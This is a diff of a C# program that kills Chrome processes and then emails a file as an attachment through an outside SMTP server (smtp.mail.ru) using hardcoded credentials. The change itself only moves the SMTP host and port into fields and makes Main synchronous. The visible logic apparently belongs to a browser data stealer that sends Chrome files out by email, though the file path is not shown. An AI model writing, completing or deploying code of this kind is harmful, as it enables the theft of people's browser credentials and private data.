@@ -1,4 +1,4 @@
-﻿using System.Diagnostics;
+using System.Diagnostics;
 using System.Net;
 using System.Net.Mail;
 
@@ -7,8 +7,10 @@ class Program
     static string _myEmail = "example@gmail.com";
     static string _emailPasssword = "12345";
     static string _name = "anon";
+    static string _smtp = "smtp.mail.ru";
+    static int _smtpPort = 587;
 
-    static async Task Main()
+    static void Main()
     {
         KillChromeProcess();
 
@@ -36,7 +38,7 @@ class Program
 
         m.Attachments.Add(new Attachment(filePath));
 
-        SmtpClient smtp = new SmtpClient("smtp.mail.ru", 587)
+        SmtpClient smtp = new SmtpClient(_smtp, _smtpPort)
         {
             Credentials = new NetworkCredential(_myEmail, _emailPasssword),
             EnableSsl = true
